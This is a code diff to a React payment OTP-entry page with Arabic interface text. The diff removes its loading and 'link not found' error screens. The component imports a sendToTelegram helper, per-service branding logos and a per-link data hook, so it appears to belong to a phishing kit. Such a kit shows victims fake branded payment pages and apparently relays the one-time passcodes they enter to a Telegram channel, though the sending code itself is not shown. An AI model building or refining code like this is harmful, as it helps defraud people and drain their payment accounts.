@@ -4,7 +4,7 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
-import { Shield, AlertCircle, ArrowLeft, Loader2 } from "lucide-react";
+import { Shield, AlertCircle, ArrowLeft } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { useLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
@@ -13,7 +13,7 @@ const PaymentOTPForm = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { toast } = useToast();
-  const { data: linkData, isLoading, error } = useLink(id);
+  const { data: linkData } = useLink(id);
   
   const [otp, setOtp] = useState<string[]>(["", "", "", "", "", ""]);
   const [attempts, setAttempts] = useState(0);
@@ -34,32 +34,6 @@ const PaymentOTPForm = () => {
   
   // Demo OTP: 123456
   const DEMO_OTP = "123456";
-  
-  // Show loading state
-  if (isLoading) {
-    return (
-      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
-        <div className="text-center">
-          <Loader2 className="w-12 h-12 animate-spin mx-auto mb-4 text-primary" />
-          <p className="text-muted-foreground">جاري التحميل...</p>
-        </div>
-      </div>
-    );
-  }
-  
-  // Show error state only after loading is complete
-  if (!isLoading && (error || !linkData)) {
-    return (
-      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
-        <div className="text-center p-8">
-          <AlertCircle className="w-16 h-16 mx-auto mb-4 text-destructive" />
-          <h2 className="text-2xl font-bold mb-2 text-foreground">الرابط غير موجود</h2>
-          <p className="text-muted-foreground mb-6">الرجاء التحقق من صحة الرابط</p>
-          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
-        </div>
-      </div>
-    );
-  }
   
   // Countdown timer effect
   useEffect(() => {
